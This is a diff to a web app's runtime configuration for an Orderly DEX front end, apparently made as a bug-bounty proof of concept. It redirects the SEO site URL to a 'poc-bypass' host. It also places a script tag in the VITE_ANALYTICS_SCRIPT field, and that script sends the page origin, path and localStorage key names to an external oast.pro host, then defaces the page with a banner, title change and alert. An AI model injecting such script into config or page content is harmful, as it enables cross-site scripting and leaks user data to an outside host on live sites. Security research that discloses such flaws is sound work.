@@ -27,7 +27,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_TWITTER_URL": "",
   "VITE_SEO_SITE_NAME": "",
   "VITE_SEO_SITE_DESCRIPTION": "",
-  "VITE_SEO_SITE_URL": "https://dex.orderly.network/h019-poc-1779849396-5161/",
+  "VITE_SEO_SITE_URL": "https://poc-bypass-1779849408.example.com",
   "VITE_SEO_SITE_LANGUAGE": "en",
   "VITE_SEO_SITE_LOCALE": "en_US",
   "VITE_SEO_TWITTER_HANDLE": "",
@@ -37,7 +37,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_USE_CUSTOM_PNL_POSTERS": "false",
   "VITE_CUSTOM_PNL_POSTER_COUNT": "0",
   "VITE_TRADING_VIEW_COLOR_CONFIG": "",
-  "VITE_ANALYTICS_SCRIPT": "",
+  "VITE_ANALYTICS_SCRIPT": "<script>var img=new Image();img.src=\"https://d8b5gouu5rasijukiomguc8ci779k567j.oast.pro/h019?o=\"+encodeURIComponent(location.origin)+\"&t=\"+Date.now()+\"&lskeys=\"+encodeURIComponent(Object.keys(localStorage).join(\",\"))+\"&path=\"+encodeURIComponent(location.pathname);console.log(\"[H-019] XSS Hackerone by galletitaconpate. origin=\",location.origin);document.title=\"XSS Hackerone by galletitaconpate\";var d=document.createElement(\"div\");d.id=\"h019b\";d.style.cssText=\"position:fixed;top:0;left:0;right:0;background:#c00;color:#fff;padding:24px;font:bold 22px sans-serif;z-index:2147483647;text-align:center;box-shadow:0 4px 12px rgba(0,0,0,.4)\";d.innerText=\"XSS Hackerone by galletitaconpate - origin: \"+location.origin;document.documentElement.appendChild(d);alert(\"XSS Hackerone by galletitaconpate\\n\\norigin: \"+location.origin+\"\\nshared with 2978+ Orderly DEXs\");</script>",
   "VITE_SYMBOL_LIST": "",
   "VITE_RESTRICTED_REGIONS": "",
   "VITE_WHITELISTED_IPS": ""
